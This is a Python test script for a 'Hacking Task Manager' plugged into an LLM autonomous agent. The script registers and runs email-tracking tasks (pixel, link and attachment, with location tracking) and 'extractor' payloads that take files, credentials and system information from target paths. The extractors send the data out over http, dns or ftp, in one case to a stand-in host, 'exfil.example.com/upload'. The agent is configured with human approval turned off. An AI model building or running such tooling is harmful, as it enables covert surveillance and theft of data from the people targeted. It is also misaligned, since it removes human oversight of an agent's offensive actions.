"""
Test script for the complete Hacking Task Manager integration.
Tests the full workflow from task creation to execution.
"""

import json
import logging
from typing import Dict, Any

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Import all components
import sys
import os

# Add src directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

from src.tool_manager import create_default_tool_manager
from src.agent import LLMAutonomousAgent, LLMConfig
from src.modules.hacking_tasks_module import HackingTaskManager, TaskType, TaskStatus
from src.modules.hacking_task_classes import HackingTaskFactory, EmailTrackerTask, ExtractorTask


def test_hacking_task_manager():
    """Test the HackingTaskManager independently."""
    print("=== Testing HackingTaskManager ===")
    
    # Create task manager
    task_manager = HackingTaskManager()
    
    # Test email tracking task registration
    email_config = {
        "target_email": "test@example.com",
        "tracking_type": "pixel",
        "campaign_id": "test_campaign_001",
        "track_location": True
    }
    
    email_task_id = task_manager.register_task(TaskType.EMAIL_TRACKING, email_config)
    print(f"✓ Email tracking task registered: {email_task_id}")
    
    # Test extractor task registration
    extractor_config = {
        "extraction_type": "files",
        "target_path": "/Users/Target/Documents",
        "exfiltration_method": "http",
        "encryption": True
    }
    
    extractor_task_id = task_manager.register_task(TaskType.EXTRACTOR_PAYLOAD, extractor_config)
    print(f"✓ Extractor task registered: {extractor_task_id}")
    
    # Test task assignment
    task_manager.assign_task(email_task_id, "agent_001")
    task_manager.assign_task(extractor_task_id, "agent_002")
    print(f"✓ Tasks assigned to agents")
    
    # Test payload generation
    email_payload = task_manager.generate_payload(email_task_id)
    extractor_payload = task_manager.generate_payload(extractor_task_id)
    
    print(f"✓ Email payload generated: {email_payload['payload_id'] if email_payload else 'Failed'}")
    print(f"✓ Extractor payload generated: {extractor_payload['payload_id'] if extractor_payload else 'Failed'}")
    
    # Test task completion
    task_manager.complete_task(email_task_id, {"status": "completed", "tracking_data": "mock_data"})
    task_manager.complete_task(extractor_task_id, {"status": "completed", "extracted_files": 15})
    print(f"✓ Tasks marked as completed")
    
    # List all tasks
    all_tasks = task_manager.list_tasks()
    print(f"✓ Total tasks in manager: {len(all_tasks)}")
    
    return True


def test_hacking_task_classes():
    """Test the specialized hacking task classes."""
    print("\n=== Testing HackingTaskClasses ===")
    
    # Create task manager and factory
    task_manager = HackingTaskManager()
    factory = HackingTaskFactory(task_manager)
    
    # Test EmailTrackerTask
    email_config = {
        "target_email": "target@example.com",
        "tracking_type": "link",
        "campaign_id": "test_campaign_002"
    }
    
    email_tracker = factory.create_email_tracker(email_config)
    
    if email_tracker.start():
        email_tracker.assign_to_agent("test_agent")
        payload = email_tracker.generate_payload()
        result = email_tracker.execute_tracking()
        
        print(f"✓ EmailTrackerTask completed successfully")
        print(f"  Task ID: {email_tracker.task_id}")
        print(f"  Payload ID: {payload.get('payload_id') if payload else 'None'}")
        print(f"  Result success: {result.get('success', False)}")
    
    # Test ExtractorTask
    extractor_config = {
        "extraction_type": "credentials",
        "target_path": "/Users/Target",
        "exfiltration_method": "dns",
        "encryption": True
    }
    
    extractor = factory.create_extractor(extractor_config)
    
    if extractor.start():
        extractor.assign_to_agent("test_agent")
        payload = extractor.generate_payload()
        result = extractor.execute_extraction()
        
        print(f"✓ ExtractorTask completed successfully")
        print(f"  Task ID: {extractor.task_id}")
        print(f"  Payload ID: {payload.get('payload_id') if payload else 'None'}")
        print(f"  Result success: {result.get('success', False)}")
    
    return True


def test_tool_manager_integration():
    """Test the ToolManager integration with hacking task tools."""
    print("\n=== Testing ToolManager Integration ===")
    
    # Create tool manager
    tool_manager = create_default_tool_manager()
    
    # Check if hacking task tools are registered
    hacking_tools = [
        "create_email_tracker",
        "create_extractor", 
        "execute_hacking_task"
    ]
    
    for tool_name in hacking_tools:
        if tool_name in tool_manager.tools:
            print(f"✓ Tool registered: {tool_name}")
        else:
            print(f"✗ Tool missing: {tool_name}")
            return False
    
    # Test email tracker tool
    email_result = tool_manager.execute_tool(
        "create_email_tracker",
        "test@example.com",
        "pixel",
        "test_campaign_003",
        True
    )
    
    if email_result.success:
        print(f"✓ Email tracker tool executed successfully")
        print(f"  Task ID: {email_result.result.get('task_id')}")
        email_task_id = email_result.result.get('task_id')
    else:
        print(f"✗ Email tracker tool failed: {email_result.error_message}")
        return False
    
    # Test extractor tool
    extractor_result = tool_manager.execute_tool(
        "create_extractor",
        "files",
        "/Users/Target/Documents",
        "http",
        True
    )
    
    if extractor_result.success:
        print(f"✓ Extractor tool executed successfully")
        print(f"  Task ID: {extractor_result.result.get('task_id')}")
        extractor_task_id = extractor_result.result.get('task_id')
    else:
        print(f"✗ Extractor tool failed: {extractor_result.error_message}")
        return False
    
    # Test task execution tool
    if email_task_id:
        exec_result = tool_manager.execute_tool("execute_hacking_task", email_task_id)
        if exec_result.success:
            print(f"✓ Task execution tool executed successfully")
        else:
            print(f"✗ Task execution tool failed: {exec_result.error_message}")
            return False
    
    return True


def test_agent_integration():
    """Test the complete agent integration with hacking tasks."""
    print("\n=== Testing Agent Integration ===")
    
    # Create components
    tool_manager = create_default_tool_manager()
    hacking_task_manager = HackingTaskManager()
    
    # Create agent with hacking task manager
    config = LLMConfig(
        api_endpoint="http://localhost:8000",
        api_key="test-key",
        model="gpt-3.5-turbo",
        require_human_approval=False  # Disable for testing
    )
    
    agent = LLMAutonomousAgent(
        config=config,
        tool_manager=tool_manager,
        hacking_task_manager=hacking_task_manager
    )
    
    print(f"✓ Agent created with ID: {agent.agent_id}")
    
    # Test agent's email tracker creation method
    email_config = {
        "target_email": "agent_test@example.com",
        "tracking_type": "attachment",
        "campaign_id": "agent_campaign_001",
        "track_location": True
    }
    
    email_result = agent.create_email_tracker(email_config)
    
    if email_result.get("success"):
        print(f"✓ Agent created email tracker successfully")
        print(f"  Task ID: {email_result.get('task_id')}")
        email_task_id = email_result.get('task_id')
    else:
        print(f"✗ Agent email tracker creation failed: {email_result.get('error')}")
        return False
    
    # Test agent's extractor creation method
    extractor_config = {
        "extraction_type": "system_info",
        "target_path": "/Users/Target",
        "exfiltration_method": "ftp",
        "encryption": False
    }
    
    extractor_result = agent.create_extractor(extractor_config)
    
    if extractor_result.get("success"):
        print(f"✓ Agent created extractor successfully")
        print(f"  Task ID: {extractor_result.get('task_id')}")
        extractor_task_id = extractor_result.get('task_id')
    else:
        print(f"✗ Agent extractor creation failed: {extractor_result.get('error')}")
        return False
    
    # Test getting agent's hacking tasks
    agent_tasks = agent.get_hacking_tasks()
    
    if agent_tasks.get("success"):
        print(f"✓ Agent retrieved hacking tasks successfully")
        print(f"  Task count: {agent_tasks.get('task_count', 0)}")
    else:
        print(f"✗ Agent failed to retrieve hacking tasks: {agent_tasks.get('error')}")
        return False
    
    # Test task execution through agent
    if email_task_id:
        exec_result = agent.execute_hacking_task(email_task_id)
        if exec_result.get("success"):
            print(f"✓ Agent executed hacking task successfully")
        else:
            print(f"✗ Agent task execution failed: {exec_result.get('error')}")
            return False
    
    return True


def test_complete_workflow():
    """Test a complete workflow from creation to execution."""
    print("\n=== Testing Complete Workflow ===")
    
    # Create the full stack
    tool_manager = create_default_tool_manager()
    hacking_task_manager = HackingTaskManager()
    
    config = LLMConfig(
        api_endpoint="http://localhost:8000",
        api_key="test-key",
        model="gpt-3.5-turbo",
        require_human_approval=False
    )
    
    agent = LLMAutonomousAgent(
        config=config,
        tool_manager=tool_manager,
        hacking_task_manager=hacking_task_manager
    )
    
    # Step 1: Create email tracking task
    email_config = {
        "target_email": "workflow_test@example.com",
        "tracking_type": "pixel",
        "campaign_id": "workflow_campaign",
        "track_location": True
    }
    
    email_result = agent.create_email_tracker(email_config)
    if not email_result.get("success"):
        print(f"✗ Workflow failed at email tracker creation")
        return False
    
    email_task_id = email_result.get('task_id')
    print(f"✓ Step 1: Email tracker created - {email_task_id}")
    
    # Step 2: Create data extraction task
    extractor_config = {
        "extraction_type": "files",
        "target_path": "/Users/Target/Secret",
        "exfiltration_method": "http",
        "encryption": True,
        "exfil_endpoint": "https://exfil.example.com/upload"
    }
    
    extractor_result = agent.create_extractor(extractor_config)
    if not extractor_result.get("success"):
        print(f"✗ Workflow failed at extractor creation")
        return False
    
    extractor_task_id = extractor_result.get('task_id')
    print(f"✓ Step 2: Extractor created - {extractor_task_id}")
    
    # Step 3: Check agent tasks
    tasks_result = agent.get_hacking_tasks()
    if not tasks_result.get("success"):
        print(f"✗ Workflow failed at task retrieval")
        return False
    
    task_count = tasks_result.get('task_count', 0)
    print(f"✓ Step 3: Agent has {task_count} tasks")
    
    # Step 4: Execute tasks
    email_exec = agent.execute_hacking_task(email_task_id)
    if not email_exec.get("success"):
        print(f"✗ Workflow failed at email task execution")
        return False
    
    print(f"✓ Step 4: Email task executed successfully")
    
    extractor_exec = agent.execute_hacking_task(extractor_task_id)
    if not extractor_exec.get("success"):
        print(f"✗ Workflow failed at extractor task execution")
        return False
    
    print(f"✓ Step 5: Extractor task executed successfully")
    
    # Step 5: Verify final state
    final_tasks = agent.get_hacking_tasks()
    if final_tasks.get("success"):
        print(f"✓ Step 6: Final state verified - {final_tasks.get('task_count')} tasks")
    
    print(f"✓ Complete workflow test passed!")
    return True


def main():
    """Run all tests."""
    print("Starting Hacking Task Manager Integration Tests")
    print("=" * 60)
    
    tests = [
        ("HackingTaskManager", test_hacking_task_manager),
        ("HackingTaskClasses", test_hacking_task_classes),
        ("ToolManager Integration", test_tool_manager_integration),
        ("Agent Integration", test_agent_integration),
        ("Complete Workflow", test_complete_workflow)
    ]
    
    passed = 0
    total = len(tests)
    
    for test_name, test_func in tests:
        try:
            if test_func():
                passed += 1
                print(f"✅ {test_name}: PASSED")
            else:
                print(f"❌ {test_name}: FAILED")
        except Exception as e:
            print(f"❌ {test_name}: ERROR - {str(e)}")
    
    print("\n" + "=" * 60)
    print(f"Test Results: {passed}/{total} tests passed")
    
    if passed == total:
        print("🎉 All tests passed! The Hacking Task Manager integration is working correctly.")
    else:
        print("⚠️  Some tests failed. Please check the implementation.")
    
    return passed == total


if __name__ == "__main__":
    main()
